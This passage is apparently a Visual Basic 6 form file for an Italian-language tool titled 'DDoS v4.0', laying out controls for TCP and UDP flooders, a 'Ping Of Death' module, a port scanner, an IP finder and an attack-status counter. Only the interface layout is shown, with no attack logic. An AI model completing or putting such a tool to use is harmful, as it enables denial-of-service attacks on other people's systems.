VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{2A6D8023-0587-4248-B0CB-11006E6C640B}#4.1#0"; "CoolXPButton.ocx"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "DDoS v4.0 By xXManuddXx"
   ClientHeight    =   9840
   ClientLeft      =   45
   ClientTop       =   735
   ClientWidth     =   8490
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   9840
   ScaleWidth      =   8490
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   6360
      Top             =   8760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock WinsockPacket 
      Left            =   7800
      Top             =   8880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer7 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   6720
      Top             =   9600
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   8040
      Top             =   360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin CoolXPButton.xpButton xpButton20 
      Height          =   255
      Left            =   4920
      TabIndex        =   50
      Top             =   8400
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   450
      Caption         =   "Start"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.TextBox Text6 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   975
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   49
      Top             =   8400
      Width           =   2895
   End
   Begin CoolXPButton.xpButton xpButton19 
      Height          =   255
      Left            =   4680
      TabIndex        =   48
      Top             =   9000
      Width           =   2175
      _ExtentX        =   3836
      _ExtentY        =   450
      Caption         =   "Visualizza Sito"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Frame Frame6 
      Caption         =   "Stato Attacco"
      Height          =   1095
      Left            =   120
      TabIndex        =   39
      Top             =   7200
      Width           =   8295
      Begin VB.Label Label17 
         AutoSize        =   -1  'True
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   7200
         TabIndex        =   47
         Top             =   600
         Width           =   135
      End
      Begin VB.Label Label16 
         AutoSize        =   -1  'True
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   5400
         TabIndex        =   46
         Top             =   600
         Width           =   135
      End
      Begin VB.Label Label15 
         AutoSize        =   -1  'True
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   3240
         TabIndex        =   45
         Top             =   600
         Width           =   135
      End
      Begin VB.Label Label14 
         AutoSize        =   -1  'True
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   1080
         TabIndex        =   44
         Top             =   600
         Width           =   135
      End
      Begin VB.Label Label13 
         AutoSize        =   -1  'True
         Caption         =   "Ping ICMP"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   6840
         TabIndex        =   43
         Top             =   240
         Width           =   960
      End
      Begin VB.Label Label12 
         AutoSize        =   -1  'True
         Caption         =   "Pacchetti Inviati"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   4680
         TabIndex        =   42
         Top             =   240
         Width           =   1605
      End
      Begin VB.Label Label11 
         AutoSize        =   -1  'True
         Caption         =   "Connessioni UDP"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   2520
         TabIndex        =   41
         Top             =   240
         Width           =   1650
      End
      Begin VB.Label Label10 
         AutoSize        =   -1  'True
         Caption         =   "Connessioni TCP"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   360
         TabIndex        =   40
         Top             =   240
         Width           =   1620
      End
   End
   Begin VB.Frame Frame5 
      Caption         =   "Port Scanner"
      Height          =   1095
      Left            =   120
      TabIndex        =   30
      Top             =   6120
      Width           =   8295
      Begin MSWinsockLib.Winsock Winsock4 
         Left            =   3840
         Top             =   120
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   270
         Left            =   3240
         Top             =   240
      End
      Begin CoolXPButton.xpButton xpButton18 
         Height          =   255
         Left            =   3360
         TabIndex        =   38
         Top             =   600
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         Caption         =   "Reset"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.ListBox List1 
         Height          =   645
         Left            =   4920
         TabIndex        =   37
         Top             =   240
         Width           =   3255
      End
      Begin CoolXPButton.xpButton xpButton17 
         Height          =   255
         Left            =   1800
         TabIndex        =   35
         Top             =   600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton16 
         Height          =   255
         Left            =   240
         TabIndex        =   34
         Top             =   600
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text8 
         Height          =   285
         Left            =   2280
         TabIndex        =   32
         Text            =   "500"
         Top             =   240
         Width           =   855
      End
      Begin VB.TextBox Text7 
         Height          =   285
         Left            =   600
         TabIndex        =   31
         Text            =   "0"
         Top             =   240
         Width           =   855
      End
      Begin VB.Label Label9 
         AutoSize        =   -1  'True
         Caption         =   "Porte Aperte--->"
         Height          =   195
         Left            =   3600
         TabIndex        =   36
         Top             =   240
         Width           =   1110
      End
      Begin VB.Label Label8 
         AutoSize        =   -1  'True
         Caption         =   "A:"
         Height          =   195
         Left            =   1680
         TabIndex        =   33
         Top             =   240
         Width           =   150
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Ping Of Death"
      Height          =   1335
      Left            =   120
      TabIndex        =   18
      Top             =   4680
      Width           =   8295
      Begin VB.Timer TimerICMP 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   5520
         Top             =   840
      End
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   7080
         Top             =   840
      End
      Begin CoolXPButton.xpButton xpButton15 
         Height          =   280
         Left            =   3720
         TabIndex        =   29
         Top             =   840
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   503
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton14 
         Height          =   285
         Left            =   1680
         TabIndex        =   28
         Top             =   840
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   503
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton13 
         Height          =   255
         Left            =   7560
         TabIndex        =   26
         Top             =   360
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   450
         Caption         =   "Set"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   6600
         TabIndex        =   25
         Text            =   "1000"
         Top             =   360
         Width           =   855
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Apri Ogni M/S"
         Height          =   255
         Left            =   5160
         TabIndex        =   24
         Top             =   360
         Width           =   1335
      End
      Begin CoolXPButton.xpButton xpButton12 
         Height          =   300
         Left            =   3960
         TabIndex        =   23
         Top             =   360
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   529
         Caption         =   "Ping"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   2400
         TabIndex        =   22
         Text            =   "2000"
         Top             =   360
         Width           =   1335
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   480
         TabIndex        =   20
         Text            =   "500"
         Top             =   360
         Width           =   975
      End
      Begin VB.Label Label7 
         AutoSize        =   -1  'True
         Caption         =   "PING ICMP"
         Height          =   195
         Left            =   380
         TabIndex        =   27
         Top             =   870
         Width           =   825
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         Caption         =   "Time:"
         Height          =   195
         Left            =   1920
         TabIndex        =   21
         Top             =   360
         Width           =   390
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         Caption         =   "KB:"
         Height          =   195
         Left            =   120
         TabIndex        =   19
         Top             =   360
         Width           =   255
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Udp Flooder"
      Height          =   2295
      Left            =   4320
      OLEDropMode     =   1  'Manual
      TabIndex        =   5
      Top             =   2400
      Width           =   4095
      Begin MSWinsockLib.Winsock Winsock3 
         Index           =   0
         Left            =   2160
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         Protocol        =   1
      End
      Begin MSComctlLib.Slider Slider2 
         Height          =   255
         Left            =   360
         TabIndex        =   62
         Top             =   1320
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   450
         _Version        =   393216
      End
      Begin VB.TextBox Text10 
         Height          =   285
         Left            =   1320
         TabIndex        =   57
         Text            =   "80"
         Top             =   960
         Width           =   2055
      End
      Begin VB.Timer Timer6 
         Left            =   3600
         Top             =   240
      End
      Begin VB.Timer Timer5 
         Enabled         =   0   'False
         Interval        =   100
         Left            =   2880
         Top             =   240
      End
      Begin CoolXPButton.xpButton xpButton11 
         Height          =   300
         Left            =   2280
         TabIndex        =   17
         Top             =   1800
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   529
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton10 
         Height          =   300
         Left            =   120
         TabIndex        =   16
         Top             =   1800
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   529
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton9 
         Height          =   375
         Left            =   2640
         TabIndex        =   15
         Top             =   480
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Più"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton8 
         Height          =   375
         Left            =   480
         TabIndex        =   14
         Top             =   480
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Meno"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label22 
         AutoSize        =   -1  'True
         Caption         =   "Porta:"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   600
         TabIndex        =   56
         Top             =   960
         Width           =   495
      End
      Begin VB.Label Label4 
         AutoSize        =   -1  'True
         Caption         =   "2"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   300
         Left            =   1920
         TabIndex        =   13
         Top             =   480
         Width           =   120
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "Thereads"
         Height          =   195
         Left            =   1680
         TabIndex        =   12
         Top             =   240
         Width           =   675
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Port Fuck/DDoS TCP"
      Height          =   2295
      Left            =   120
      TabIndex        =   4
      Top             =   2400
      Width           =   4095
      Begin MSComctlLib.Slider SD 
         Height          =   255
         Left            =   480
         TabIndex        =   61
         Top             =   1320
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   450
         _Version        =   393216
         Min             =   1
         SelStart        =   1
         Value           =   1
      End
      Begin VB.TextBox Text9 
         Height          =   285
         Left            =   1320
         TabIndex        =   54
         Text            =   "80"
         Top             =   960
         Width           =   1935
      End
      Begin VB.Timer Timer4 
         Enabled         =   0   'False
         Interval        =   100
         Left            =   3240
         Top             =   240
      End
      Begin VB.Timer Timer3 
         Enabled         =   0   'False
         Interval        =   2000
         Left            =   2640
         Top             =   240
      End
      Begin CoolXPButton.xpButton xpButton7 
         Height          =   300
         Left            =   2280
         TabIndex        =   11
         Top             =   1800
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   529
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton6 
         Height          =   300
         Left            =   240
         TabIndex        =   10
         Top             =   1800
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   529
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton5 
         Height          =   375
         Left            =   2640
         TabIndex        =   9
         Top             =   480
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Più"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton4 
         Height          =   375
         Left            =   360
         TabIndex        =   8
         Top             =   480
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   661
         Caption         =   "Meno"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label21 
         AutoSize        =   -1  'True
         Caption         =   "Porta:"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   480
         TabIndex        =   55
         Top             =   960
         Width           =   495
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Caption         =   "2"
         BeginProperty Font 
            Name            =   "Impact"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   345
         Left            =   1920
         TabIndex        =   7
         Top             =   480
         Width           =   150
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         Caption         =   "Thereads"
         Height          =   195
         Left            =   1680
         TabIndex        =   6
         Top             =   240
         Width           =   675
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Opzioni Sito"
      BeginProperty Font 
         Name            =   "Impact"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1215
      Left            =   120
      TabIndex        =   0
      Top             =   1080
      Width           =   8175
      Begin MSWinsockLib.Winsock WinsockIP 
         Left            =   5040
         Top             =   720
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin CoolXPButton.xpButton xpButton1 
         Height          =   255
         Left            =   3000
         TabIndex        =   3
         Top             =   840
         Width           =   1935
         _ExtentX        =   3413
         _ExtentY        =   450
         Caption         =   "Trova IP"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
